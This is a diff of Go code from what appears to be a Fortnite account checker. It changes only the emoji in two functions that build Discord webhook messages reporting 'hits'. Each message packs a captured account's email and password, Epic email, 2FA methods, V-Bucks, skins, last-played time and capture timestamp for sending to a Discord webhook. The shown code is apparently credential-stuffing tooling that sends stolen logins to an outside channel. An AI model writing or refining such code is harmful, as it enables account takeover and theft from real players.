@@ -420,56 +420,56 @@ func sendDiscordWebhookForExclusive(acc, displayName, skinsList, exclusiveReason
 	payload := map[string]interface{}{
 		"embeds": []map[string]interface{}{
 			{
-				"title": "🎉 Exclusive Fortnite Hit!",
+				"title": "Exclusive Fortnite Hit!",
 				"color": 0x00ff00,
 				"fields": []map[string]interface{}{
 					{
-						"name":   "💰 Account",
+						"name":   "Account",
 						"value":  fmt.Sprintf("`%s:%s`", email, password),
 						"inline": false,
 					},
 					{
-						"name":   "👤 Display Name",
+						"name":   "Display Name",
 						"value":  fmt.Sprintf("`%s`", displayName),
 						"inline": true,
 					},
 					{
-						"name":   "📧 Epic Email",
+						"name":   "Epic Email",
 						"value":  fmt.Sprintf("`%s`", epicEmail),
 						"inline": true,
 					},
 					{
-						"name":   "🎨 Skins",
+						"name":   "Skins",
 						"value":  skinsValue,
 						"inline": false,
 					},
 					{
-						"name":   "🎯 Exclusive Trigger",
+						"name":   "Exclusive Trigger",
 						"value":  fmt.Sprintf("`%s`", exclusiveReason),
 						"inline": true,
 					},
 					{
-						"name":   "💎 V-Bucks",
+						"name":   "V-Bucks",
 						"value":  fmt.Sprintf("`%d`", totalVbucks),
 						"inline": true,
 					},
 					{
-						"name":   "🔐 2FA Methods",
+						"name":   "2FA Methods",
 						"value":  fmt.Sprintf("`%s`", alternateMethods),
 						"inline": true,
 					},
 					{
-						"name":   "🌐 Has STW",
+						"name":   "Has STW",
 						"value":  fmt.Sprintf("`%t`", hasStw),
 						"inline": true,
 					},
 					{
-						"name":   "⏰ Last Played",
+						"name":   "Last Played",
 						"value":  fmt.Sprintf("`%s`", lastPlayed),
 						"inline": true,
 					},
 					{
-						"name":   "📅 Captured At",
+						"name":   "Captured At",
 						"value":  fmt.Sprintf("`%s`", time.Now().Format("2006-01-02 15:04:05")),
 						"inline": true,
 					},
@@ -508,51 +508,51 @@ func sendDiscordWebhookForHit(acc, displayName, skinsCountStr, epicEmail, altern
 	payload := map[string]interface{}{
 		"embeds": []map[string]interface{}{
 			{
-				"title": "✅ Fortnite Hit Found!",
+				"title": "Fortnite Hit Found!",
 				"color": 0x3498db,
 				"fields": []map[string]interface{}{
 					{
-						"name":   "💰 Account",
+						"name":   "Account",
 						"value":  fmt.Sprintf("`%s:%s`", email, password),
 						"inline": false,
 					},
 					{
-						"name":   "👤 Display Name",
+						"name":   "Display Name",
 						"value":  fmt.Sprintf("`%s`", displayName),
 						"inline": true,
 					},
 					{
-						"name":   "📧 Epic Email",
+						"name":   "Epic Email",
 						"value":  fmt.Sprintf("`%s`", epicEmail),
 						"inline": true,
 					},
 					{
-						"name":   "🎨 Skins",
+						"name":   "Skins",
 						"value":  fmt.Sprintf("`%s`", skinsCountStr),
 						"inline": false,
 					},
 					{
-						"name":   "💎 V-Bucks",
+						"name":   "V-Bucks",
 						"value":  fmt.Sprintf("`%d`", totalVbucks),
 						"inline": true,
 					},
 					{
-						"name":   "🔐 2FA Status",
+						"name":   "2FA Status",
 						"value":  fmt.Sprintf("`%s`", twofaStatus),
 						"inline": true,
 					},
 					{
-						"name":   "🌐 Has STW",
+						"name":   "Has STW",
 						"value":  fmt.Sprintf("`%t`", hasStw),
 						"inline": true,
 					},
 					{
-						"name":   "⏰ Last Played",
+						"name":   "Last Played",
 						"value":  fmt.Sprintf("`%s`", lastPlayed),
 						"inline": true,
 					},
 					{
-						"name":   "📅 Captured At",
+						"name":   "Captured At",
 						"value":  fmt.Sprintf("`%s`", time.Now().Format("2006-01-02 15:04:05")),
 						"inline": true,
 					},
